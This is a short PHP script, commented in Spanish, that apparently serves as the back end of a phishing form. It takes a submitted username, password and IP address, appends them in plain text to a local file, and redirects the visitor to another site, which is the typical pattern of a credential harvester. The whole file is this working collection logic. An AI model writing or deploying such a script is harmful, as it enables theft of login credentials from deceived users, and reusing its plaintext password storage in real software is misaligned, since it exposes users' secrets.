<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    $ip = $_POST["ip"];

    // Guardar los datos en un archivo de texto
    $datos = "IP del usuario: $ip\r\nNombre de usuario: $username\r\nContraseña: $password\r\n";
    file_put_contents("datos_formulario.txt", $datos, FILE_APPEND);

    // Redirigir al usuario a una página específica
    header("Location: https://www.ejemplo.com/pagina-redireccionada.html");
    exit;
}
?>
